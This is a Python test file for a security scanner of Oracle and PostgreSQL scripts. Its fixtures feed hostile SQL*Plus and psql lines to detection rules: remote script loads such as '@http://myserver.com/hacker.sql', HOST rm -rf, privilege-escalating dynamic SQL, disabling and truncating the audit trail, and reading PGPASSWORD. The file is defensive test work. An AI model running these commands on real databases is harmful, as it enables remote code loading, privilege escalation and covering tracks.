"""Tests fuer die aus der PL/SQL-Source-Code-Analyse abgeleiteten
neuen Oracle-Sicherheitsregeln (A-F):

A  IDENTIFIED BY (Passwort im Code setzen/aendern)
B  hartcodierte Passwoerter/Geheimnisse
C  DBMS_SYS_SQL.PARSE / PARSE_AS_USER als SQL-Injection-Trigger
D  Zugriff ueber Datenbank-Link (@dblink)
E  concat() als Konkatenation in dynamischem SQL
F  Betriebssystembefehl ueber SQL*Plus HOST / !

sowie der nq'/Nq'-Masking-Fix in source.py.
"""

from aci.source import Source
from aci.checks import SqlInjectionCheck, build_mitre_checks
from aci.rules import load_mitre_rules, find_mitre_dir
from aci.finding import Severity


def mitre_findings(code, mitre_base):
    rules = load_mitre_rules(find_mitre_dir("oracle", mitre_base), "oracle")
    checks = build_mitre_checks(rules, "oracle")
    source = Source(code, "t.sql", "oracle")
    out = []
    for check in checks:
        out.extend(check.run(source))
    return out


def sqli(code, oracle_rules):
    source = Source(code, "t.sql", "oracle")
    return SqlInjectionCheck(
        oracle_rules.check("sql_injection"), "oracle").run(source)


# -- A: IDENTIFIED BY (Klartext) -----------------------------------------

def test_identified_by_cleartext_is_flagged(mitre_base):
    f = mitre_findings("ALTER USER scott IDENTIFIED BY tiger;\n", mitre_base)
    assert any("IDENTIFIED BY" in x.message for x in f)


def test_identified_by_in_dynamic_sql_is_flagged(mitre_base):
    code = ("BEGIN\n  EXECUTE IMMEDIATE 'ALTER USER \"' || p_user || "
            "'\" IDENTIFIED BY \"' || p_pw || '\"';\nEND;\n")
    f = mitre_findings(code, mitre_base)
    assert any("IDENTIFIED BY" in x.message for x in f)


def test_identified_by_values_is_not_double_flagged(mitre_base):
    # IDENTIFIED BY VALUES wird von der bestehenden Hash-Regel abgedeckt -
    # die neue Klartext-Regel darf hier NICHT zusaetzlich anschlagen.
    f = mitre_findings("ALTER USER x IDENTIFIED BY VALUES 'AB12CD34';\n",
                       mitre_base)
    hits = [x for x in f if "IDENTIFIED BY" in x.message]
    assert len(hits) == 1


# -- B: hartcodierte Passwoerter -----------------------------------------

def test_hardcoded_password_is_flagged(mitre_base):
    f = mitre_findings("l_password VARCHAR2(30) := 'secret123';\n",
                       mitre_base)
    assert any("Hartcodiert" in x.message for x in f)


def test_hardcoded_password_short_name(mitre_base):
    # Beispiel aus den Folien: TRACEPASSWD VARCHAR2(10) := 'NEDC';
    f = mitre_findings("TRACEPASSWD VARCHAR2(10) := 'NEDC';\n", mitre_base)
    assert any("Hartcodiert" in x.message for x in f)


def test_password_from_parameter_is_not_flagged(mitre_base):
    f = mitre_findings("l_password VARCHAR2(30) := p_input;\n", mitre_base)
    assert not any("Hartcodiert" in x.message for x in f)


def test_non_password_variable_is_not_flagged(mitre_base):
    f = mitre_findings("l_label VARCHAR2(30) := 'Gesamtsumme';\n", mitre_base)
    assert not any("Hartcodiert" in x.message for x in f)


# -- C: DBMS_SYS_SQL als SQL-Injection-Trigger ---------------------------

def test_dbms_sys_sql_parse_as_user_concat_is_critical(oracle_rules):
    code = ("BEGIN\n"
            "  DBMS_SYS_SQL.PARSE_AS_USER(c, 'grant dba to ' || p_user, "
            "1, 5);\n"
            "END;\n")
    f = sqli(code, oracle_rules)
    assert any(x.severity == Severity.CRITICAL for x in f)


def test_dbms_sys_sql_parse_is_a_trigger(oracle_rules):
    code = ("BEGIN\n"
            "  DBMS_SYS_SQL.PARSE(c, 'select * from ' || p_tab, 1);\n"
            "END;\n")
    f = sqli(code, oracle_rules)
    assert any(x.severity == Severity.CRITICAL for x in f)


# -- D: Datenbank-Link-Nutzung -------------------------------------------

def test_database_link_usage_is_flagged(mitre_base):
    f = mitre_findings("SELECT ename FROM emp@remote_db;\n", mitre_base)
    assert any("Datenbank-Link" in x.message for x in f)


def test_no_database_link_no_finding(mitre_base):
    f = mitre_findings("SELECT ename FROM emp WHERE deptno = 10;\n",
                       mitre_base)
    assert not any("Datenbank-Link" in x.message for x in f)


def test_sqlplus_script_call_is_not_flagged_as_dblink(mitre_base):
    # Regression: ein Wort am Zeilenende und ein SQL*Plus-@skript-Aufruf
    # in einer spaeteren Zeile duerfen NICHT als objekt@dblink gelten.
    code = "spool off\n\n\n@count_all.tmp\n"
    f = mitre_findings(code, mitre_base)
    assert not any("Datenbank-Link" in x.message for x in f)


def test_database_link_with_spaces_around_at_is_not_flagged(mitre_base):
    # Ein echter dblink-Verweis hat kein Leerzeichen ums @.
    f = mitre_findings("SELECT * FROM emp @ remote_db;\n", mitre_base)
    assert not any("Datenbank-Link" in x.message for x in f)


# -- E: concat() in dynamischem SQL --------------------------------------

def test_concat_with_variable_is_critical(oracle_rules):
    code = ("BEGIN\n"
            "  EXECUTE IMMEDIATE concat('select * from ', p_table);\n"
            "END;\n")
    f = sqli(code, oracle_rules)
    assert any(x.severity == Severity.CRITICAL for x in f)


def test_concat_only_literals_is_not_critical(oracle_rules):
    code = ("BEGIN\n"
            "  EXECUTE IMMEDIATE concat('select 1 ', 'from dual');\n"
            "END;\n")
    f = sqli(code, oracle_rules)
    assert all(x.severity != Severity.CRITICAL for x in f)


def test_concat_sanitized_is_not_critical(oracle_rules):
    code = ("BEGIN\n"
            "  EXECUTE IMMEDIATE concat('select * from ', "
            "DBMS_ASSERT.SQL_OBJECT_NAME(p_tab));\n"
            "END;\n")
    f = sqli(code, oracle_rules)
    assert all(x.severity != Severity.CRITICAL for x in f)


# -- F: OS-Befehl ueber SQL*Plus HOST / ! --------------------------------

def test_host_command_is_flagged(mitre_base):
    f = mitre_findings("HOST rm -rf /tmp/x\nSELECT 1 FROM dual;\n",
                       mitre_base)
    assert any("HOST" in x.message for x in f)


def test_shell_escape_is_flagged(mitre_base):
    f = mitre_findings("! ls -la /tmp\n", mitre_base)
    assert any("HOST" in x.message or "!" in x.message for x in f)


def test_host_as_variable_assignment_is_not_flagged(mitre_base):
    f = mitre_findings("HOST := 5;\n", mitre_base)
    assert not any("SQL*Plus" in x.message for x in f)


# -- nq'/Nq'-Masking-Fix --------------------------------------------------

def test_nq_quote_literal_is_masked():
    s = Source("v := nq'#it''s fine#';\n", "t.sql", "oracle")
    assert len(s.string_spans) == 1
    assert s.string_content(s.string_spans[0]) == "it''s fine"
    assert "fine" not in s.code_masked


def test_q_quote_still_works():
    s = Source("v := q'[plain]' || x;\n", "t.sql", "oracle")
    assert len(s.string_spans) == 1
    assert s.string_content(s.string_spans[0]) == "plain"


# -- GRANT ... TO PUBLIC (T1098) -----------------------------------------

def test_grant_to_public_is_flagged(mitre_base):
    f = mitre_findings("GRANT SELECT ON t TO PUBLIC;\n", mitre_base)
    assert any(x.check_id == "T1098" for x in f)


def test_grant_to_public_in_dynamic_sql_is_flagged(mitre_base):
    code = ("BEGIN\n"
            "  EXECUTE IMMEDIATE 'grant read on rdf_value$ to public';\n"
            "END;\n")
    assert any(x.check_id == "T1098"
               for x in mitre_findings(code, mitre_base))


def test_grant_to_named_role_is_not_public(mitre_base):
    f = mitre_findings("GRANT SELECT ON t TO app_role;\n", mitre_base)
    assert not any(x.check_id == "T1098" for x in f)


def test_grant_to_public_in_comment_is_not_flagged(mitre_base):
    code = "-- GRANT SELECT ON t TO PUBLIC;\nSELECT 1 FROM dual;\n"
    assert not any(x.check_id == "T1098"
                   for x in mitre_findings(code, mitre_base))


# -- Undokumentierter Underscore-Parameter (T1562) -----------------------

def test_underscore_parameter_is_flagged(mitre_base):
    f = mitre_findings(
        'ALTER SESSION SET "_optimizer_mode_force" = FALSE;\n', mitre_base)
    assert any(x.check_id == "T1562" for x in f)


def test_normal_session_parameter_is_not_flagged(mitre_base):
    f = mitre_findings(
        "ALTER SESSION SET NLS_DATE_FORMAT = 'YYYY-MM-DD';\n", mitre_base)
    assert not any(x.check_id == "T1562" for x in f)


# -- ACI 2.9.0: zusaetzliche Oracle-MITRE-Regeln -------------------------

def _has(findings, rule_id):
    return any(x.check_id == rule_id for x in findings)


def test_administer_key_management_is_flagged(mitre_base):
    f = mitre_findings(
        "ADMINISTER KEY MANAGEMENT CREATE KEYSTORE '/ks' IDENTIFIED BY x;\n",
        mitre_base)
    assert _has(f, "T1552-KEY-MANAGEMENT")


def test_create_credential_is_flagged(mitre_base):
    f = mitre_findings("CREATE CREDENTIAL app_cred;\n", mitre_base)
    assert _has(f, "T1552-CREATE-CREDENTIAL")


def test_create_public_database_link_is_flagged(mitre_base):
    f = mitre_findings(
        "CREATE PUBLIC DATABASE LINK lk CONNECT TO u "
        "IDENTIFIED BY p USING 'remote';\n", mitre_base)
    assert _has(f, "T1021-CREATE-DBLINK")


def test_dbms_cloud_export_is_flagged(mitre_base):
    f = mitre_findings(
        "BEGIN DBMS_CLOUD.EXPORT_DATA(credential_name => 'C'); END;\n",
        mitre_base)
    assert _has(f, "T1567-DBMS-CLOUD-EXPORT")


def test_clob2file_is_flagged(mitre_base):
    f = mitre_findings(
        "BEGIN DBMS_XSLPROCESSOR.CLOB2FILE(l_clob, 'DIR', 'f.txt'); END;\n",
        mitre_base)
    assert _has(f, "T1048-CLOB2FILE")


def test_nologging_is_flagged(mitre_base):
    f = mitre_findings("ALTER TABLE t NOLOGGING;\n", mitre_base)
    assert _has(f, "T1562-NOLOGGING")


def test_truncate_audit_table_is_flagged(mitre_base):
    f = mitre_findings("TRUNCATE TABLE sys.aud$;\n", mitre_base)
    assert _has(f, "T1070-AUDIT-TABLE-DROP")


def test_critical_alter_system_parameter_is_flagged(mitre_base):
    f = mitre_findings("ALTER SYSTEM SET audit_trail = none;\n", mitre_base)
    assert _has(f, "T1562-AUTH-PARAM")


def test_normal_alter_system_parameter_is_not_flagged(mitre_base):
    f = mitre_findings("ALTER SYSTEM SET open_cursors = 300;\n", mitre_base)
    assert not _has(f, "T1562-AUTH-PARAM")


# -- AUTHID DEFINER + dynamisches SQL (T1548-DYNAMIC-SQL) ----------------

_DEF_DYN = ("CREATE OR REPLACE PROCEDURE p(p_id IN VARCHAR2) AUTHID DEFINER "
            "IS\nBEGIN\n  EXECUTE IMMEDIATE 'select * from t where id=' "
            "|| p_id;\nEND;\n/\n")


def test_definer_with_dynamic_sql_is_flagged(mitre_base):
    assert _has(mitre_findings(_DEF_DYN, mitre_base), "T1548-DYNAMIC-SQL")


def test_current_user_with_dynamic_sql_is_not_flagged(mitre_base):
    code = _DEF_DYN.replace("AUTHID DEFINER", "AUTHID CURRENT_USER")
    assert not _has(mitre_findings(code, mitre_base), "T1548-DYNAMIC-SQL")


def test_definer_without_dynamic_sql_is_not_flagged(mitre_base):
    code = ("CREATE OR REPLACE PROCEDURE p AUTHID DEFINER IS\nBEGIN\n"
            "  INSERT INTO audit VALUES (1);\nEND;\n/\n")
    assert not _has(mitre_findings(code, mitre_base), "T1548-DYNAMIC-SQL")


# -- DBMS_SESSION.SET_ROLE (T1548-SET-ROLE) ------------------------------

def test_set_role_is_flagged(mitre_base):
    f = mitre_findings("BEGIN DBMS_SESSION.SET_ROLE('dba'); END;\n", mitre_base)
    assert _has(f, "T1548-SET-ROLE")


def test_set_role_in_comment_is_not_flagged(mitre_base):
    code = "-- DBMS_SESSION.SET_ROLE('dba')\nSELECT 1 FROM dual;\n"
    assert not _has(mitre_findings(code, mitre_base), "T1548-SET-ROLE")


# -- LDAP-Injection (ACI-ORA-LDAP-INJECTION) -----------------------------

def test_ldap_injection_with_concat_is_flagged(mitre_base):
    code = ("BEGIN\n  r := DBMS_LDAP.search_s(s, '(uid=' || p_user || ')', "
            "2);\nEND;\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-ORA-LDAP-INJECTION")


def test_ldap_literal_filter_is_not_flagged(mitre_base):
    code = ("BEGIN\n  r := DBMS_LDAP.search_s(s, '(uid=admin)', 2);\nEND;\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-ORA-LDAP-INJECTION")


# -- XPath-/XQuery-Injection (ACI-ORA-XPATH-INJECTION) -------------------

def test_xpath_injection_with_concat_is_flagged(mitre_base):
    code = ("BEGIN\n  SELECT extractvalue(x, '/u[@n=\"' || p_user || '\"]') "
            "INTO y FROM t;\nEND;\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-ORA-XPATH-INJECTION")


def test_xpath_literal_expression_is_not_flagged(mitre_base):
    code = ("BEGIN\n  SELECT extractvalue(x, '/u[@n=\"admin\"]') INTO y "
            "FROM t;\nEND;\n")
    assert not _has(mitre_findings(code, mitre_base), "ACI-ORA-XPATH-INJECTION")


# -- SQL*Plus / edbplus Client-Direktiven --------------------------------

def test_sqlplus_run_script_is_flagged(mitre_base):
    f = mitre_findings("@install.sql\nSELECT 1 FROM dual;\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")


def test_sqlplus_double_at_is_flagged(mitre_base):
    assert _has(mitre_findings("@@child.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-RUN-SCRIPT")


# -- ACI 2.19.0: Remote-Skriptaufrufe (@ @@ START via URL/UNC) ----------

def test_sqlplus_remote_http_at_is_critical(mitre_base):
    f = mitre_findings("@http://myserver.com/hacker.sql\n", mitre_base)
    hit = [x for x in f if x.check_id == "ACI-ORA-SQLPLUS-REMOTE-SCRIPT"]
    assert hit and hit[0].severity is Severity.CRITICAL
    # Remote-Fall wird aus der generischen RUN-SCRIPT-Regel ausgeschlossen.
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")


def test_sqlplus_remote_ftp_at_is_flagged(mitre_base):
    assert _has(mitre_findings("@ftp://myserver.com/hacker.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_http_double_at_is_flagged(mitre_base):
    f = mitre_findings("@@http://myserver.com/hacker.sql\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")


def test_sqlplus_remote_ftp_double_at_is_flagged(mitre_base):
    assert _has(mitre_findings("@@ftp://myserver.com/hacker.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_http_start_is_flagged(mitre_base):
    assert _has(mitre_findings("START http://myserver.com/hacker.sql\n",
                               mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_http_sta_short_form(mitre_base):
    # F3: STA[RT] - Kurzform STA.
    assert _has(mitre_findings("STA http://myserver.com/hacker.sql\n",
                               mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_ftp_sta_short_form(mitre_base):
    assert _has(mitre_findings("STA ftp://myserver.com/hacker.sql\n",
                               mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_https_sta_short_form(mitre_base):
    assert _has(mitre_findings("STA https://myserver.com/hacker.sql\n",
                               mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_sta_local_script_is_not_remote(mitre_base):
    # STA install.sql -> lokaler Skriptaufruf (RUN-SCRIPT), nicht Remote.
    f = mitre_findings("STA install.sql\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_statistics_identifier_is_not_remote_or_runscript(mitre_base):
    # FP-Schutz: STATISTICS/STAT... darf STA-Kurzform nicht ausloesen.
    f = mitre_findings("STATISTICS_PKG.refresh;\n", mitre_base)
    assert not _has(f, "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")


def test_client_directive_snippets_are_single_line(mitre_base):
    # F4: aufeinanderfolgende Remote-Direktiven duerfen NICHT zu einem
    # gemeinsamen Snippet verschmelzen - jede Fundstelle nur ihre Zeile.
    code = ("@http://a.example/x.sql\n"
            "@@ftp://b.example/y.sql\n"
            "START http://c.example/z.sql\n")
    f = [x for x in mitre_findings(code, mitre_base)
         if x.check_id == "ACI-ORA-SQLPLUS-REMOTE-SCRIPT"]
    by_line = {x.line: x.snippet for x in f}
    assert by_line[1] == "@http://a.example/x.sql"
    assert by_line[2] == "@@ftp://b.example/y.sql"
    assert by_line[3] == "START http://c.example/z.sql"
    # Snippet von Zeile 1 enthaelt KEINE der spaeteren Direktiven.
    assert "ftp://b.example" not in by_line[1]
    assert "c.example" not in by_line[1]


def test_sqlplus_remote_ftp_start_is_flagged(mitre_base):
    assert _has(mitre_findings("START ftp://myserver.com/hacker.sql\n",
                               mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_whitespace_after_at_is_flagged(mitre_base):
    assert _has(mitre_findings("@   http://x/s.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_start_without_whitespace_is_flagged(mitre_base):
    # START ohne Whitespace-Pflicht (Entscheidung c).
    assert _has(mitre_findings("START//srv/share/s.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_https_is_flagged(mitre_base):
    # https:// wird von Oracle nicht ausgefuehrt, gilt aber als verdaechtig.
    assert _has(mitre_findings("@https://x/s.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_unc_forward_is_flagged(mitre_base):
    assert _has(mitre_findings("@//server/share/s.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_unc_backslash_is_flagged(mitre_base):
    assert _has(mitre_findings("@\\\\server\\share\\s.sql\n", mitre_base),
                "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_local_script_is_not_remote(mitre_base):
    f = mitre_findings("@scripts/local.sql\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_absolute_local_path_is_not_remote(mitre_base):
    assert not _has(mitre_findings("@/opt/oracle/x.sql\n", mitre_base),
                    "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_variable_path_is_not_remote(mitre_base):
    f = mitre_findings("@&script_name\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")
    assert not _has(f, "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_sqlplus_remote_in_string_literal_is_not_flagged(mitre_base):
    assert not _has(mitre_findings("SELECT '@http://x' FROM dual;\n",
                                   mitre_base), "ACI-ORA-SQLPLUS-REMOTE-SCRIPT")


def test_start_with_clause_is_not_run_script(mitre_base):
    # 'START WITH' (CONNECT BY) am Zeilenanfang ist KEIN Skriptaufruf.
    code = "SELECT x FROM t\nSTART WITH id = 1\nCONNECT BY PRIOR id = pid;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-RUN-SCRIPT")


def test_sqlplus_spool_is_flagged(mitre_base):
    f = mitre_findings("SPOOL /tmp/out.log\nSELECT 1 FROM dual;\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-SPOOL")


def test_sqlplus_spool_off_is_not_flagged(mitre_base):
    assert not _has(mitre_findings("SPOOL OFF\n", mitre_base),
                    "ACI-ORA-SQLPLUS-SPOOL")


def test_sqlplus_substitution_in_security_context_is_flagged(mitre_base):
    # Substitution in sicherheitsrelevanter Anweisung (GRANT) -> Warning.
    code = "GRANT &priv TO scott;\n"
    assert _has(mitre_findings(code, mitre_base), "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_sqlplus_substitution_in_plain_select_is_not_flagged(mitre_base):
    # Tightening: reine Wert-Substitution in einem SELECT loest die generische
    # Regel NICHT mehr aus (FP-Reduktion; die ACCEPT-Korrelation faengt die
    # wirklich gefaehrlichen Faelle ab).
    code = "SELECT * FROM emp WHERE ename = '&name';\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_substitution_in_comment_is_not_flagged(mitre_base):
    # Kommentar-Treffer duerfen nicht anschlagen (auch im Security-Kontext).
    code = "-- GRANT &priv TO x\nSELECT 1 FROM dual;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_accept_then_substitution_combination_is_high(mitre_base):
    code = ("ACCEPT pwd CHAR PROMPT 'Pwd: '\n"
            "ALTER USER scott IDENTIFIED BY &pwd;\n")
    f = mitre_findings(code, mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-ACCEPT-SUBSTITUTION")
    assert any(x.check_id == "ACI-ORA-SQLPLUS-ACCEPT-SUBSTITUTION"
               and x.severity == Severity.HIGH for x in f)


def test_substitution_without_accept_is_not_accept_combo(mitre_base):
    # &var ohne vorheriges ACCEPT/DEFINE -> keine High-Kombinationsregel.
    code = "GRANT &priv TO scott;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-ACCEPT-SUBSTITUTION")


def test_set_define_off_suppresses_substitution(mitre_base):
    # In einer SET DEFINE OFF-Region ist & kein Substitutions-Trigger.
    code = "SET DEFINE OFF\nGRANT &priv TO scott;\nSET DEFINE ON\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_set_define_on_after_off_re_enables(mitre_base):
    code = ("SET DEFINE OFF\nGRANT &a TO x;\nSET DEFINE ON\n"
            "GRANT &b TO y;\n")
    f = mitre_findings(code, mitre_base)
    lines = {x.line for x in f if x.check_id == "ACI-ORA-SQLPLUS-SUBSTITUTION"}
    assert 2 not in lines and 4 in lines


def test_set_define_off_suppresses_accept_substitution(mitre_base):
    code = ("ACCEPT pwd CHAR PROMPT 'p:'\nSET DEFINE OFF\n"
            "ALTER USER x IDENTIFIED BY &pwd;\nSET DEFINE ON\n")
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-ACCEPT-SUBSTITUTION")


def test_whenever_sqlerror_continue_is_flagged(mitre_base):
    code = "WHENEVER SQLERROR CONTINUE\nGRANT dba TO x;\n"
    assert _has(mitre_findings(code, mitre_base),
                "ACI-ORA-SQLPLUS-WHENEVER-CONTINUE")


def test_whenever_sqlerror_exit_is_not_flagged(mitre_base):
    code = "WHENEVER SQLERROR EXIT FAILURE\nGRANT dba TO x;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-WHENEVER-CONTINUE")


# -- SET DEFINE <char> State-Machine (TODO 5) ----------------------------

def test_set_define_caret_detects_caret_substitution(mitre_base):
    code = "SET DEFINE ^\nCREATE USER ^username IDENTIFIED BY x;\n"
    assert _has(mitre_findings(code, mitre_base), "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_set_define_caret_ignores_ampersand(mitre_base):
    # Unter SET DEFINE ^ ist & kein Substitutionszeichen mehr.
    code = "SET DEFINE ^\nCREATE USER &username IDENTIFIED BY x;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_set_define_ampersand_restores_default(mitre_base):
    code = ("SET DEFINE ^\nSET DEFINE &\n"
            "GRANT dba TO &username;\n")
    assert _has(mitre_findings(code, mitre_base), "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_set_scan_off_suppresses_substitution(mitre_base):
    code = "SET SCAN OFF\nGRANT dba TO &username;\nSET SCAN ON\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_set_define_caret_accept_combination(mitre_base):
    code = ("ACCEPT username CHAR PROMPT 'u:'\nSET DEFINE ^\n"
            "CREATE USER ^username IDENTIFIED BY x;\n")
    assert _has(mitre_findings(code, mitre_base),
                "ACI-ORA-SQLPLUS-ACCEPT-SUBSTITUTION")


# -- Weitere Client-Skript-Edge-Cases (TODO 6) ---------------------------

def test_double_at_variable_script_is_flagged(mitre_base):
    assert _has(mitre_findings("@@&child_script\n", mitre_base),
                "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")


def test_whenever_oserror_continue_is_flagged(mitre_base):
    assert _has(mitre_findings("WHENEVER OSERROR CONTINUE\nHOST x\n",
                               mitre_base),
                "ACI-ORA-SQLPLUS-WHENEVER-CONTINUE")


def test_prompt_with_substitution_is_not_security_finding(mitre_base):
    # PROMPT-Zeile mit &var ist kein sicherheitsrelevanter Kontext.
    code = "PROMPT Bitte &name eingeben\nSELECT 1 FROM dual;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_comment_with_amp_var_is_not_substitution(mitre_base):
    code = "-- GRANT dba TO &x (nur Doku)\nSELECT 1 FROM dual;\n"
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-ORA-SQLPLUS-SUBSTITUTION")


def test_psql_getenv_is_flagged(mitre_base):
    f = _pg_mitre("\\getenv v PGPASSWORD\n", mitre_base)
    assert _has(f, "ACI-PG-PSQL-ENV")


def test_psql_meta_in_comment_is_not_flagged(mitre_base):
    # Kommentartext, der wie ein Meta-Kommando aussieht, darf nicht greifen.
    code = "-- nutze \\copy t TO PROGRAM 'cmd' fuer den Export\nSELECT 1;\n"
    assert not _has(_pg_mitre(code, mitre_base), "ACI-PG-PSQL-COPY-PROGRAM")


def test_psql_copy_program_tab_whitespace_variant(mitre_base):
    f = _pg_mitre("\\copy\tt\tTO\tPROGRAM\t'cmd'\n", mitre_base)
    assert _has(f, "ACI-PG-PSQL-COPY-PROGRAM")


def test_sqlplus_accept_is_flagged(mitre_base):
    assert _has(mitre_findings("ACCEPT pw CHAR PROMPT 'pw: '\n", mitre_base),
                "ACI-ORA-SQLPLUS-ACCEPT")


def test_sqlplus_variable_script_call_is_flagged(mitre_base):
    f = mitre_findings("@&install_step\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")


def test_sqlplus_start_variable_is_flagged(mitre_base):
    assert _has(mitre_findings("START &1\n", mitre_base),
                "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")


def test_sqlplus_literal_script_is_not_var(mitre_base):
    # @deploy.sql -> generische RUN-SCRIPT (Warning), NICHT die VAR-Regel.
    f = mitre_findings("@deploy/grants.sql\n", mitre_base)
    assert _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")


def test_start_with_clause_not_treated_as_script(mitre_base):
    code = "SELECT x FROM t\nSTART WITH id = 1\nCONNECT BY PRIOR id = pid;\n"
    f = mitre_findings(code, mitre_base)
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT")
    assert not _has(f, "ACI-ORA-SQLPLUS-RUN-SCRIPT-VAR")


def test_host_rule_still_flags_after_migration(mitre_base):
    # T1059 HOST wurde auf client_directive migriert - muss weiter greifen.
    f = mitre_findings("HOST rm -rf /tmp/x\nSELECT 1 FROM dual;\n", mitre_base)
    assert _has(f, "T1059")


def _pg_mitre(code, mitre_base):
    rules = load_mitre_rules(find_mitre_dir("postgresql", mitre_base),
                             "postgresql")
    checks = build_mitre_checks(rules, "postgresql")
    source = Source(code, "t.sql", "postgresql")
    out = []
    for check in checks:
        out.extend(check.run(source))
    return out


def test_pg_copy_program_is_flagged(mitre_base):
    f = _pg_mitre("\\copy t TO PROGRAM 'gzip > t.gz'\n", mitre_base)
    assert _has(f, "ACI-PG-PSQL-COPY-PROGRAM")


def test_pg_copy_file_is_not_program(mitre_base):
    f = _pg_mitre("\\copy t FROM 'data.csv'\n", mitre_base)
    assert not _has(f, "ACI-PG-PSQL-COPY-PROGRAM")


def test_pg_gexec_is_flagged(mitre_base):
    f = _pg_mitre("SELECT 'x' FROM t;\n\\gexec\n", mitre_base)
    assert _has(f, "ACI-PG-PSQL-GEXEC")


# -- APEX / ORDS ---------------------------------------------------------

def test_apex_function_body_returning_sql_is_flagged(mitre_base):
    # "PL/SQL Function Body returning SQL" aus Session State - kein Sink.
    code = ("CREATE OR REPLACE FUNCTION rep RETURN VARCHAR2 IS\n"
            "  l_sql VARCHAR2(4000);\n"
            "BEGIN\n"
            "  l_sql := 'select * from orders where cust = ' "
            "|| APEX_UTIL.GET_SESSION_STATE('P1_CUST');\n"
            "  RETURN l_sql;\nEND;\n/\n")
    assert _has(mitre_findings(code, mitre_base),
                "ACI-APEX-DYNSQL-SESSION-STATE")


def test_apex_return_concat_without_local_var_is_flagged(mitre_base):
    # Direktes RETURN '...' || V('P1_x') (ohne lokale Variable / Deklaration).
    code = ("CREATE OR REPLACE FUNCTION rep2 RETURN VARCHAR2 IS\n"
            "BEGIN\n"
            "  RETURN 'select * from emp where ename = ''' || "
            "V('P1_NAME') || '''';\nEND;\n/\n")
    assert _has(mitre_findings(code, mitre_base),
                "ACI-APEX-DYNSQL-SESSION-STATE")


def test_apex_return_with_bind_is_not_flagged(mitre_base):
    # Bindevariable IM SQL-Text (kein ||) -> sicher, kein Finding.
    code = ("CREATE OR REPLACE FUNCTION rep RETURN VARCHAR2 IS\n"
            "BEGIN\n  RETURN 'select * from emp where deptno = :P1_DEPT';\n"
            "END;\n/\n")
    assert not _has(mitre_findings(code, mitre_base),
                    "ACI-APEX-DYNSQL-SESSION-STATE")


def test_apex_non_sql_concat_is_not_flagged(mitre_base):
    # APEX-Item, aber kein SQL-Schluesselwort -> nicht als SQL gewertet.
    code = ("CREATE OR REPLACE FUNCTION greet RETURN VARCHAR2 IS\n"
            "BEGIN\n  RETURN 'Hello ' || V('P1_NAME');\nEND;\n/\n")
    assert not _has(mitre_findings(code, mitre_base),
